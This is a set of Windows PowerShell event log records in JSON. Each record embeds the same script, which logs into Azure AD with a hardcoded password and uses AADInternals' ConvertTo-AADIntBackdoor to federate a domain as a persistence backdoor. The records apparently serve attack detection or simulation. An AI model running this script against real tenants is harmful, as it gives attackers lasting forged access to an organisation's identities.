{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:55.9575880"},"EventRecordID":"1094","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:55.9666085"},"EventRecordID":"1095","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:55.9716095"},"EventRecordID":"1096","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:55.9754305"},"EventRecordID":"1097","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:55.9754305"},"EventRecordID":"1098","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:55.9754305"},"EventRecordID":"1099","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:56.0904373"},"EventRecordID":"1100","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=3f9a08c3-ccce-4932-968d-39e66930e135\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:57.0652881"},"EventRecordID":"1101","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Certificate, Started, \tProviderName=Certificate\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=3f9a08c3-ccce-4932-968d-39e66930e135\r\n\tPipelineId=2\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-26 19:10:57.2706270"},"EventRecordID":"1102","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=17\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=cea9a6f7-9410-461c-8e6d-1ec1d0ecfeaa\r\n\tHostApplication=powershell.exe &amp; {Import-Module AzureAD\r\nImport-Module AADInternals\r\n\r\n$PWord = ConvertTo-SecureString -String \"iamthebatman\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"bruce.wayne@contosocloud.com\", $Pword\r\n\r\ntry {\r\n Connect-AzureAD -Credential $Credential -ErrorAction Stop &gt; $null\r\n}\r\ncatch {\r\n Write-Host \"Error: AzureAD could not connect\"\r\n exit 1\r\n}\r\n\r\ntry {\r\n $domain = Get-AzureADDomain -Name \"contoso.com\"\r\n}\r\ncatch {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not found\"\r\n exit 1\r\n}\r\nif (-Not $domain.IsVerified) {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" not verified\"\r\n exit 1\r\n}\r\n\r\nif ($domain.AuthenticationType -eq \"Federated\") {\r\n Write-Host \"Error: domain \"\"contoso.com\"\" already federated. Try with a different domain or re-create it before.\"\r\n exit 1\r\n}\r\n\r\n$at = Get-AADIntAccessTokenForAADGraph -Credentials $Credential\r\nif (-Not $at) {\r\n Write-Host \"Error: AADInternals could not connect\"\r\n exit 1\r\n}\r\n\r\n$new = ConvertTo-AADIntBackdoor -AccessToken $at -DomainName \"contoso.com\"\r\nif ($new) {\r\n Write-Host \"Federation successfully added to Azure AD\"\r\n Write-Host $new\r\n}\r\nelse {\r\n Write-Host \"The federation setup failed\"\r\n}\r\n\r\nWrite-Host \"End of federation configuration.\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=3f9a08c3-ccce-4932-968d-39e66930e135\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
